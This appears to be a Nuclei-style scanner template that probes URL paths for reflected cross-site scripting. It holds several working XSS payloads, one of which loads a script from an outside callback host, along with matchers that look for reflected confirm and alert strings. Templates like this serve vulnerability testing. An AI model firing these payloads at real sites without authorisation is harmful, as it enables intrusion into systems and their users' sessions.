id: PARAM-PATH-XSS
info:
  author: 25
  name: Reflected Cross-Site Scripting (XSS)
  severity: high
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - <script>confirm(25)</script>
  - condition: or
    part: body
    type: word
    words:
    - <img src=x onerror=confirm(25)>
  - condition: or
    part: body
    type: word
    words:
    - <svg/onload=confirm(25)>
  - part: body
    type: word
    words:
    - <body/onload=alert(25)>
  - part: body
    type: word
    words:
    - <iframe/src=javascript:alert(25)>
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}{{payload}}'
  payloads:
    payload:
    - '"></script><script/src=https://just25testing.xss.ht></script>'
    - '"><script>confirm(25)</script>'
    - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
    - '"><svg/onload=confirm(25)>'
    - '"><body/onload=alert(25)>'
    - '"><iframe/src=javascript:alert(25)>'
  stop-at-first-match: true
